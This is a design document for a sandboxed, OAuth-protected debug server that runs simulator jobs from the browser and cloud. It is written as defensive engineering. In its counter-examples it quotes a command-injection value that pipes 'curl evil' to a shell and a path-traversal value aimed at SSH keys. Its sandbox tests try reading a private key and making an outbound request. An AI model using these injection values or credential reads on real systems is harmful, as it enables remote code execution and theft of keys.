# The KPU Debug Server: Runs from the Browser, Reachable from the Cloud, Behind OAuth

**Date:** 2026-11-25
**Status:** Design

Builds on the first stage, the read-only server on loopback
(`docs/plans/cycle-mflow-and-debug-server.md` §3.6, steps 7–8). Decided on 2026-11-25:
- **Sign-in:** a generic OIDC/OAuth layer, with GitHub as the first provider.
- **Reachability:** a Cloudflare Tunnel.
- **Jobs:** typed parameters only.
- **Access:** an allowlist with roles.

## 1. Problem Statement

The first-stage server shows runs to a laptop on an SSH tunnel. It cannot start an experiment,
so every experiment begins in an SSH shell. It is not reachable from anything that cannot open
an SSH tunnel to this machine:
- a phone or a borrowed laptop;
- a cloud agent or a CI job;
- a colleague without a shell account.

It has no notion of who is asking. That is safe on loopback and unacceptable anywhere else.

What we need:
1. **Start runs from the browser:** pick an experiment (a matmul size and device, a memory-side
   scenario, an LPDDR5 pattern), set its parameters, watch it run, and land in its views.
2. **Be reachable from cloud services** at a stable HTTPS address, with no inbound port opened on
   this machine.
3. **Know who is asking** through a proper OAuth sign-in, and decide by role what they may do. A
   machine client (an agent, a CI job) authenticates without a browser.
4. **Not become a remote shell.** A job runs one of our tools, with parameters checked against a
   schema, in a sandbox that cannot read this account's secrets. Today the server's user holds
   SSH keys and a `gh` token.

**Non-goals:**
- Building code from the browser. Jobs run the binaries already built on this machine (§3.4).
- Uploading arbitrary programs or binaries (§7, Q4).
- Running jobs on more than this one machine.

## 2. Architecture

```
  laptop browser       cloud agent / CI job             GitHub (OAuth)       OIDC issuer (later)
       │                      │                              ▲                      ▲
       │ HTTPS                │ HTTPS + Bearer token         │ code → token → /user │ discovery, JWKS
       ▼                      ▼                              │                      │
┌───────────────────────────────────────────┐               │                      │
│ Cloudflare edge: kpu-debug.<domain>       │               │                      │
│ TLS ends here                             │               │                      │
└────────────────────┬──────────────────────┘               │                      │
                     │ outbound-only tunnel (no inbound port)                       │
┌────────────────────┼─────────────────────── this machine (headless Linux) ───────┼────────┐
│                    ▼                                                              │        │
│  cloudflared (systemd) ──► 127.0.0.1:8080                                          │        │
│  ┌──────────────────────────────────────────────────────────────────────────────┐ │        │
│  │ kpu-debug-server (FastAPI + uvicorn, user kpu-debug, loopback only)          │ │        │
│  │                                                                              │ │        │
│  │  ┌────────────────┐   ┌──────────────────┐   ┌──────────────────────────┐   │ │        │
│  │  │ auth/          │   │ api/v1           │   │ core/ (from stage 1)     │   │ │        │
│  │  │ providers:     │──►│ runs  jobs       │──►│ run discovery            │   │ │        │
│  │  │  github, oidc  │   │ job-types tokens │   │ path confinement         │   │ │        │
│  │  │ sessions,      │   │ files  views     │   │ viewer registry          │   │ │        │
│  │  │ API tokens,    │   │ events (SSE)     │   └──────────────────────────┘   │ │        │
│  │  │ roles          │   └────────┬─────────┘                                  │ │        │
│  │  └───────┬────────┘            │ submit (typed spec)                        │ │        │
│  │          │ allowlist           ▼                                            │ │        │
│  │          │ (users.toml)  ┌──────────────────┐   ┌──────────────────────┐    │ │        │
│  │          ▼               │ jobs/            │   │ state.sqlite         │    │ │        │
│  │      audit log ◄─────────│ registry→argv    │◄─►│ users·sessions·tokens│    │ │        │
│  │                          │ queue, load gate │   │ jobs·audit           │    │ │        │
│  │                          └────────┬─────────┘   └──────────────────────┘    │ │        │
│  └───────────────────────────────────┼──────────────────────────────────────────┘ │        │
│                                      │ systemd-run --scope (CPU, memory, time limits)        │
│                                      ▼                                                       │
│                   ┌──────────────────────────────────────────────────────┐                   │
│                   │ bwrap sandbox: no network, no $HOME                  │                   │
│                   │  ro: /usr, build/bin, repo inputs                    │                   │
│                   │  rw: runs/web/<user>/<job>/ only                     │                   │
│                   │  argv: kpu-run …  (no shell)                         │                   │
│                   └──────────────────────────────────────────────────────┘                   │
└──────────────────────────────────────────────────────────────────────────────────────────────┘
```

| Component | Where | Role |
|---|---|---|
| `core/` | `tools/debug-server/kpu_debug/core/` (stage 1) | Run discovery, path confinement, viewer registry: plain functions |
| `auth/` | `kpu_debug/auth/` | Providers, sessions, API tokens, roles, the allowlist |
| `jobs/` | `kpu_debug/jobs/` | Job-type registry, argv builder, queue, sandbox, load gate |
| `api/` | `kpu_debug/api/` | The REST API (`/api/v1`), OpenAPI, server-sent events |
| `ui/` | `kpu_debug/ui/` | Runs index, job form (generated from the job type's schema), job page |
| `state.sqlite` | `/var/lib/kpu-debug/` | Users, sessions, tokens, jobs, audit. One file, WAL mode |
| `cloudflared` | systemd unit | The outbound tunnel. The only path in from outside |

## 3. Design

### 3.1 The stack

The first stage is standard library only, and should stay that way: it serves files on loopback.
This server signs people in, verifies tokens and runs jobs. That is the wrong place to hand-roll
OAuth, JWT or session handling.
- **FastAPI and uvicorn** for HTTP, the generated OpenAPI and the request schemas.
- **Authlib** for OAuth 2.0 and OIDC: authorization code with PKCE, discovery, and JWKS
  verification.
- **SQLite** through the standard library's `sqlite3`.

The dependencies go in `tools/debug-server/requirements.txt`, pinned. FastAPI is already in the
project's Python 3.11 venv.

`kpu_debug serve --auth none` is the first stage's mode. It refuses to start unless bound to
loopback. Once this server's step 2 lands, the standard-library HTTP layer is deleted and both
modes share one codebase.

### 3.2 Identity: providers, sessions, roles

**One interface, two kinds of provider.** GitHub sign-in is OAuth 2.0, not OIDC: it issues an
access token but no ID token. Identity comes from `GET /user`. A real OIDC provider (Google,
Entra, Okta, Auth0) issues a signed ID token. Both resolve to the same `Identity`:

```python
@dataclass(frozen=True)
class Identity:
    provider: str      # "github" | an OIDC issuer URL
    subject: str       # GitHub's numeric user id | the OIDC "sub" claim
    display: str       # login or name, for display only

class Provider(Protocol):
    def authorize_url(self, state: str, pkce_challenge: str, nonce: str) -> str: ...
    async def identify(self, code: str, pkce_verifier: str, nonce: str) -> Identity: ...
```

```python
# WRONG: keying users by login or email.
#   A GitHub login can be renamed and then claimed by someone else. An email
#   can be unverified, and it is personal data we should not need.
user = allowlist.get(github_user["login"])

# WRONG: keeping the provider's access token "in case".
#   It is a credential to the user's GitHub account. We never call GitHub
#   on their behalf, so we must not hold it.
session["gh_token"] = token["access_token"]

# CORRECT: key by (provider, immutable subject); drop the provider token
# once identity is known.
ident = Identity("github", str(github_user["id"]), github_user["login"])
user = allowlist.lookup(ident.provider, ident.subject)   # None → 403, audit "denied"
del token
```

**The flow:**
1. **Start:** `/auth/login/<provider>` generates `state`, a PKCE verifier and challenge, and (for
   OIDC) a `nonce`. It stores them in a short-lived pre-session (5 minutes, single use).
2. **Callback:** `/auth/callback/<provider>` checks `state`, exchanges the code with the
   verifier, verifies the ID token for OIDC (issuer, audience, expiry, nonce, signature against
   JWKS), and resolves the `Identity`.
3. **Admit:** the allowlist admits the identity or the server answers 403. Either way the
   attempt is audited.
4. **Session:** the server issues a new opaque session ID (256 random bits; only its SHA-256 is
   stored). The cookie is `__Host-kpu_session`: `Secure`, `HttpOnly`, `SameSite=Lax`, `Path=/`.
   A session lasts 8 hours idle and 7 days at most. Logout deletes the row.

The redirect URI is fixed per provider (`https://kpu-debug.<domain>/auth/callback/github`) and is
registered with the provider. The server never builds a redirect from request data.

**The allowlist** is `users.toml`. It is read at startup and on `SIGHUP`. It is not editable
from the web in v1, so a stolen admin session cannot add accounts:

```toml
[[user]]
provider = "github"
subject  = "1234567"        # numeric id, from https://api.github.com/users/<login>
name     = "theo"           # display only
role     = "admin"
```

**Roles** are cumulative:

| Role | May |
|---|---|
| `viewer` | List and open runs, use every view, read job logs |
| `runner` | Everything a viewer may, and submit and cancel their own jobs, and create API tokens up to `runner` |
| `admin` | Everything a runner may, and cancel any job, delete or pin runs, revoke any token, read the audit log |

One dependency per route enforces the role. A test enumerates every route in the OpenAPI document
and fails if a route has no role, so a new route cannot be public by omission.

**CSRF.** Each state-changing request (POST or DELETE) from a browser session needs an
`Origin` header equal to the public origin, and a CSRF token that is bound to the session and
sent in a header. Bearer-token requests carry no cookie and are exempt.

### 3.3 Machine clients: API tokens

A cloud agent or a CI job cannot complete a browser sign-in. A signed-in user creates a token:

- **Format:** `kpud_<id>_<secret>`, with 256 bits of secret. The token is shown once. Only the
  secret's SHA-256 is stored.
- **Scope:** a role no higher than the creator's, and an expiry of at most 90 days.
- **Ownership:** it belongs to its creator. Jobs it submits are theirs and land under their run
  directory. It dies with their allowlist entry.
- **Use:** `Authorization: Bearer kpud_…`. Each use updates `last_used` and is audited.

Later (step 10), GitHub Actions' OIDC tokens can be trusted directly. A trust rule names a
repository and ref (`repo:stillwater-sc/kpu-sim:ref:refs/heads/main`) and a role. The server
verifies the job's ID token against GitHub's JWKS, with our audience. CI then needs no stored
secret.

### 3.4 Jobs: typed specs, never a command line

A **job type** is a name, a parameter schema and a function from validated parameters to argv.
The registry is code, reviewed like any other:

```python
# WRONG: a command line from the browser.
#   "--size 64; curl evil | sh", or "--program ../../../.ssh/id_rsa".
#   Even without a shell, a free-form flag list lets a user pass any flag the
#   tool has, including ones that write files outside the run directory.
subprocess.run(f"kpu-run {request.args}", shell=True)
subprocess.run(["kpu-run", *request.json["argv"]])

# CORRECT: a schema with closed types, and argv built only by the server.
class MatmulRun(BaseModel):
    model_config = ConfigDict(extra="forbid")
    size: Literal[16, 32, 64, 128, 256]
    tile: Literal[8, 16, 32]
    dtype: Literal["int8", "bf16", "fp32"]
    device: DeviceRef            # one of the deployment files the registry lists
    memory_subsystem: bool = True

def matmul_argv(p: MatmulRun, run_dir: Path) -> list[list[str]]:
    csp = run_dir / "program.csp"
    return [
        [BIN / "kpu-csp-gen", "--algo", "matmul", "--size", str(p.size), "--tile", str(p.tile),
         "--dtype", p.dtype, "--target", p.device.path, "-o", csp],
        [BIN / "kpu-run", "--program", csp, "--deploy", p.device.path,
         *(["--memory-subsystem"] if p.memory_subsystem else []), "--run-dir", run_dir],
    ]
```

**Rules for every job type:**
- **Closed parameter types:** `Literal`, bounded integers, or a `*Ref`. A `*Ref` is a value
  chosen from an enumerated list (deployment files under `tests/program/deploy/`, scenarios
  under a scenarios directory, LPDDR5 pattern names). The server resolves it to a path and
  confines it. There are no free-form strings except a label, which is never put in argv and is
  escaped wherever it is shown.
- **The server owns the run directory.** It is `runs/web/<user-id>/<job-id>/`, and every output
  path in argv is built under it.
- **Version 1 job types:**
  - `matmul` (csp-gen, then kpu-run);
  - `memory-subsystem` (kpu-run on a repo program);
  - `memsim` (kpu-memsim with a scenario);
  - `lpddr5-pattern` (one pattern executable, writing `.mflow`).

  After the tool exits, each job runs `mflow_check.py` on its bundle, and the check's result is
  part of the job's status.
- **The binaries** come from one configured build directory (`--build`). The job records:
  - the build's git SHA;
  - whether the working tree was dirty;
  - each binary's hash.

  An experiment on uncommitted code is then visible as one, not mistaken for main.

### 3.5 Execution: queue, sandbox, limits

**The queue** is a table in `state.sqlite`: `queued → running → succeeded | failed | cancelled |
timed_out`.
- A dispatcher runs at most `max_concurrent` jobs (default 2).
- It starts a job only while the 1-minute load average is below a threshold (default 12 on this
  20-core machine), so a big build in an SSH session holds new jobs back instead of competing
  with them.
- A job left `running` when the server restarts is marked `failed (server restart)`, and its
  scope is killed.

**The sandbox.** Each job is two nested wrappers:
1. **`systemd-run --user --scope`** sets the limits: `CPUQuota` (default 400%), `MemoryMax`
   (default 8G), `TasksMax`, and `RuntimeMaxSec` (default 30 min, per job type). Cancel stops the
   scope, which kills the whole process tree.
2. **`bwrap`** sets what the job can see:

```text
bwrap --unshare-all --die-with-parent --new-session
      --ro-bind /usr /usr  --ro-bind /lib /lib  --ro-bind /lib64 /lib64  --proc /proc  --dev /dev
      --ro-bind <build>/bin /opt/kpu/bin
      --ro-bind <repo>/tests/program/deploy /opt/kpu/deploy        (inputs: only what job types reference)
      --bind    <runs>/web/<user>/<job> /run-dir
      --tmpfs /tmp   --chdir /run-dir   --clearenv  --setenv PATH /opt/kpu/bin:/usr/bin
      -- <argv>
```

- **No network:** `--unshare-all` includes the network namespace.
- **No home directory**, so no `~/.ssh`, no `~/.config/gh` and no `.env`.
- **No environment** inherited from the server, so the OAuth client secret is not visible.
- **The only writable path** is the job's run directory.

**The server's own account.** The server runs as a dedicated unprivileged user, `kpu-debug`,
not as the developer's account:
- It owns `/var/lib/kpu-debug` (state and secrets) and `runs/web/`.
- It reads the build and the repo inputs through group read permissions.

The sandbox is then a second wall, not the only one.

```python
# WRONG: trusting the sandbox to clean up after a cancel.
#   Killing the top PID leaves kpu-run's children running, outside every limit.
os.kill(job.pid, signal.SIGTERM)

# CORRECT: the scope is the unit of the job's life.
subprocess.run(["systemctl", "--user", "stop", f"kpu-job-{job.id}.scope"], check=False)
```

**Logs.** stdout and stderr are written to `run-dir/job.log` (capped at 16 MB) and streamed to
the job page over SSE.

**Retention.** Runs older than 14 days are deleted unless pinned. Each user has a disk quota
(default 20 GB); a job that would exceed it is refused at submission.

### 3.6 Reachability: Cloudflare Tunnel

`cloudflared` runs as a system service with a named tunnel. It holds an outbound connection to
Cloudflare and forwards `https://kpu-debug.<domain>` to `http://127.0.0.1:8080`.
- **No inbound port** is opened on this machine.
- **TLS** ends at Cloudflare's edge.
- **The server binds to loopback only**, in every mode, so the tunnel is the only path from
  outside.

Behind the proxy:
- **Client addresses:** the server takes the client address from `CF-Connecting-IP` only when
  the TCP peer is 127.0.0.1, and uses it for the audit log and rate limits.
- **The public origin** for redirects and the `Origin` check comes from configuration
  (`public_url`), never from the `Host` header.

**Cloudflare Access** (an identity gate at the edge) is optional: §7, Q2. The server's own
sign-in is required either way, so Access is defence in depth, not the authentication.

### 3.7 API

`/api/v1`, documented by the generated OpenAPI at `/api/v1/openapi.json`, so an agent can
discover it:

| Method and path | Role | Does |
|---|---|---|
| `GET /runs`, `GET /runs/{id}` | viewer | List runs (`run.json`) |
| `GET /files/{path}` | viewer | A file under a run, confined, with `Range` |
| `GET /job-types` | viewer | Each job type's name and JSON Schema; the UI builds its form from this |
| `POST /jobs` | runner | Submit `{type, params, label}`. Returns the job, or 422 with the schema error |
| `GET /jobs`, `GET /jobs/{id}` | viewer | Status, timings, the build, the check's result |
| `GET /jobs/{id}/log` | viewer | SSE stream of the log |
| `POST /jobs/{id}/cancel` | runner (own) or admin | Cancel |
| `POST /tokens`, `GET /tokens`, `DELETE /tokens/{id}` | runner | API tokens (own; admin: any) |
| `GET /events` | viewer | SSE: `run-added`, `job-changed` |
| `GET /audit` | admin | The audit log |

**Rate limits:** submissions per user (default 30 per hour) and sign-in attempts per IP. Both are
in memory and counted per process.

## 4. Implementation Steps

Each step is one PR with its tests. Steps 1–2 depend on the first plan's step 7.

1. **Package the core.** Make `tools/debug-server/kpu_debug/core/` the first stage's run
   discovery, path confinement and viewer registry, as plain functions with their unit tests.
   (This is how step 7 of the first plan is written, so this step may be empty.)
2. **The FastAPI app, `--auth none`.** It has the first stage's routes on the core. A parity test
   passes against both servers. Then the standard-library server is deleted. `--auth none`
   refuses a non-loopback bind.
3. **Sign-in with GitHub.**
   - Code: `auth/` (the provider interface, GitHub, pre-sessions, sessions), the allowlist,
     roles, CSRF, and the audit table.
   - Tests use a fake OAuth server in-process:
     - a non-allowlisted identity is refused;
     - a bad or reused `state` is refused;
     - session expiry;
     - the provider token is not persisted;
     - every route has a role.
4. **Generic OIDC.** The discovery-based provider. Tests use a mock issuer with its own JWKS:
   - wrong `aud`, wrong `iss`, expired, bad signature, and replayed `nonce` are each refused;
   - a good token is admitted.
5. **Job types.**
   - The registry, the four v1 types, `*Ref` enumeration and argv building.
   - Tests:
     - every type builds argv with no string from the request outside a closed set;
     - path traversal, extra fields and out-of-range values give 422;
     - a property test over random parameters never produces a path outside the run directory.
6. **Execution.**
   - The queue, the dispatcher with its load gate, `systemd-run` with `bwrap`, cancel, timeouts,
     restart recovery, `run.json` and the post-run `mflow_check.py`.
   - Tests:
     - a job that tries to read `$HOME/.ssh`, open a socket, or write outside `/run-dir` fails
       at each;
     - cancel leaves no process behind;
     - a high load holds the queue.
7. **The UI.** The runs index (from stage 1); the job form generated from `/job-types`; the job
   page with its live log, its status and links to the run's views; the token page.
8. **API tokens.** Create, list and revoke, with Bearer authentication. Tests: a token is never
   stored in plain text, its role never exceeds its creator's, expiry is enforced, and it dies
   with its creator's allowlist entry.
9. **Deployment.**
   - `tools/debug-server/deploy/`: the `kpu-debug` user setup script, the systemd units for the
     server and `cloudflared`, and the tunnel config template.
   - Secrets via `systemd-creds` or a 0600 file under `/var/lib/kpu-debug`, never in the repo.
   - Retention and the quota job.
   - `README.md`: setup, registering the GitHub OAuth app, adding a user, and using it from
     Windows, macOS and an agent.
10. **GitHub Actions OIDC trust** (later, when a workflow needs it). Trust rules in config, and
    verification against GitHub's JWKS. Tests with a mock issuer.

## 5. Verification

```bash
cd tools/debug-server
python3 -m pytest -q                                   # unit + integration, mock providers
python3 -m kpu_debug serve --auth none --root ../../runs     # stage-1 parity, loopback
python3 -m kpu_debug serve --config /etc/kpu-debug/config.toml   # full mode

# Off-host checks through the public hostname (from a laptop)
curl -sI https://kpu-debug.<domain>/api/v1/runs        # 401, no session or token
curl -s -H "Authorization: Bearer $TOK" https://kpu-debug.<domain>/api/v1/runs   # 200
curl -s -X POST -H "Authorization: Bearer $VIEWER_TOK" \
     https://kpu-debug.<domain>/api/v1/jobs -d '{}'     # 403
ss -ltnp | grep 8080                                   # 127.0.0.1:8080 only
```

**Expected:**
- **Sign-in:**
  - An allowlisted GitHub account signs in from a Windows and a macOS browser.
  - An account not on the list gets 403, and the attempt is in the audit log.
  - The session cookie has the `__Host-` prefix and is `Secure`, `HttpOnly` and `SameSite=Lax`.
- **A matmul job from the browser:**
  - It queues, runs and streams its log.
  - It finishes with `mflow_check.py` passing.
  - Its page links to the memflow viewer and the four DRAM views of its bundle.
  - Its `run.json` names the build SHA.
- **The sandbox holds:** a test job type (compiled into the tests only, never registered in
  production) tries `cat ~/.ssh/id_ed25519`, `curl https://example.com` and a write to `/tmp/x`
  outside the tmpfs. All three fail, and the job is marked failed.
- **Cancel** of a running job leaves `systemctl --user list-units 'kpu-job-*'` empty within 5 s.
- **The load gate:** with the load at 16 (a `make -j16` in a shell), a new job stays `queued`
  until the load falls below the threshold.
- **Restart recovery:** after a server restart, a job that was `running` is `failed (server
  restart)`, and its scope is gone.

## 6. Key Invariants

- **S1. No route without a role.** Every route except `/auth/*` and `/healthz` requires a role.
  A test over the OpenAPI document enforces it.
- **S2. Identity is (provider, immutable subject).** Never a login, an email or a display name.
- **S3. We hold no provider credentials.** An access or refresh token from GitHub or an OIDC
  provider is used once to establish identity, then discarded.
- **S4. Secrets are stored hashed.** Session IDs and API tokens are stored as SHA-256 hashes. A
  database leak yields no usable credential.
- **S5. No command line from a request.** argv is built only by a registered job type, from
  closed-type parameters. There is no `shell=True` anywhere in the package (a lint test greps
  for it).
- **S6. A job sees only its inputs and its run directory.** It has no network, no home
  directory, no inherited environment, and one writable path. Its CPU, memory, task count and
  run time are bounded by its scope.
- **S7. Loopback only.** The server never binds a non-loopback address. The tunnel is the only
  way in from outside.
- **S8. Everything that changes state is audited:** sign-ins (admitted or denied), job submit,
  cancel and finish, and token create, use and revoke.
- **S9. A run records its build.** Every run from the server names the git SHA, the dirty flag
  and the binary hashes it ran.

## 7. Questions for Review

1. **The hostname.** Which domain on Cloudflare hosts `kpu-debug.<domain>`? The tunnel and the
   OAuth app's callback both need it before step 9.
2. **Cloudflare Access in front?**
   - **For it:** it stops unauthenticated traffic at the edge, before it reaches this machine.
   - **Against it:** machine clients would need Cloudflare service tokens as well as ours.
   - **Recommended:** on for browser paths, with `/api/v1/*` bypassed so that our Bearer tokens
     work. Add it after step 9, once the server's own sign-in is proven.
3. **The first allowlist.** Who besides you, and with which role?
4. **Uploaded inputs.** v1 runs only repo programs, deployments and scenarios. Allowing an
   uploaded `.csp` program or scenario is a contained extension: a `*Ref` to an upload, size-
   limited, schema-checked, and visible only to its owner. But it is a new trust boundary.
   Wanted, and when?
5. **Linger.** `systemd-run --user` needs the `kpu-debug` user's manager running without a
   login (`loginctl enable-linger kpu-debug`, done once by an admin). The alternative is system
   scopes through a narrow polkit rule. Linger is simpler. Is it acceptable on this machine?
6. **An MCP endpoint.** The API is enough for agents to drive experiments. Should the server also
   expose MCP tools (list runs, submit a job, read a check's result), alongside or in place of
   the stdio `tools/mcp/kpu_sim_server.py`?
